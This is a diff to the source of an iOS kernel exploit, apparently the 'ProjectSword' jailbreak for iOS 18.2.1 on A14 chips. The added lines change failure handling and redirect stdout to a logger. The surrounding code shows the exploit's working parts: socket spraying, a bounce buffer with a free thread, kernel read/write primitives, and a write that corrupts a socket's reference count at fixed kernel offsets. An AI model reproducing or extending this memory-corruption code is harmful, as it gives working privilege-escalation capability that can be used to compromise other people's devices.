@@ -59,7 +59,30 @@ uint64_t gOurProc, gKernelProc, gOurTask, gKernelTask, gIS_TABLE;
 uint64_t gOurPmap, gKernelPmap, gKernelBase, gKernelSlide;
 
 // ===== Helpers =====
-#define FAILURE(c) {fflush(stdout); sleep(2); exit(c);}
+#define FAILURE(c) do { log_printf(@"[-] FAILURE at %s:%d\n", __FILE__, __LINE__); return; } while(0)
+
+void redirect_stdout(void) {
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        int fds[2];
+        if (pipe(fds) == 0) {
+            dup2(fds[1], STDOUT_FILENO);
+            setvbuf(stdout, NULL, _IONBF, 0);
+            fcntl(fds[0], F_SETFL, O_NONBLOCK);
+            dispatch_source_t src = dispatch_source_create(DISPATCH_SOURCE_TYPE_READ, fds[0], 0,
+                dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_LOW, 0));
+            dispatch_source_set_event_handler(src, ^{
+                char buf[4096];
+                ssize_t n = read(fds[0], buf, sizeof(buf)-1);
+                if (n > 0) {
+                    buf[n] = 0;
+                    log_printf(@"%s", buf);
+                }
+            });
+            dispatch_resume(src);
+        }
+    });
+}
 
 void memset64(void *ptr, uint64_t val, size_t sz) {
     for (size_t i = 0; i < sz; i += 8)
@@ -121,14 +144,15 @@ void *free_thread(void *arg) {
     return NULL;
 }
 
-void initialize_bounce_buffer(uint64_t size) {
+bool initialize_bounce_buffer(uint64_t size) {
     pcSize = size;
     if (!create_bounce_buffer(&pcObject, &pcAddress, pcSize))
-        FAILURE(0);
+        return false;
     freeTarget = pcAddress;
     freeTargetSize = pcSize;
     freeThreadStart = 1;
     goSync = 1;
+    return true;
 }
 
 fileport_t spray_socket(void) {
@@ -360,7 +384,11 @@ bool run_darksword(void) {
 
     void *rBuf = calloc(1, OOB_SIZE);
     void *wBuf = calloc(1, OOB_SIZE);
-    initialize_bounce_buffer(OOB_PAGES_NUM * PAGE_SIZE);
+    if (!initialize_bounce_buffer(OOB_PAGES_NUM * PAGE_SIZE)) {
+        printf("[-] initialize_bounce_buffer failed\n");
+        free(rBuf); free(wBuf);
+        return false;
+    }
 
     NSMutableArray *usedGc = [NSMutableArray new];
 
@@ -418,7 +446,7 @@ bool run_darksword(void) {
     controlSocketPcb = kread64(rwSocketPcb + 0x20);
     uint64_t csa = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
     uint64_t rsa = kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
-    if (!csa || !rsa) FAILURE(0);
+    if (!csa || !rsa) { log_printf(@"[-] No socket\n"); free(rBuf); free(wBuf); return false; }
 
     kwrite64(csa + OFFSET_SOCKET_SO_COUNT,
         kread64(csa + OFFSET_SOCKET_SO_COUNT) + 0x100010010001001ULL);
@@ -726,6 +754,7 @@ bool remount_private_preboot(void) {
 
 void run_jailbreak(void) {
     @autoreleasepool {
+        redirect_stdout();
         printf("=== ProjectSword - iOS 18.2.1 A14 ===\n\n");
 
         // Phase 1: Kernel R/W via DarkSword (ICMP6 socket)
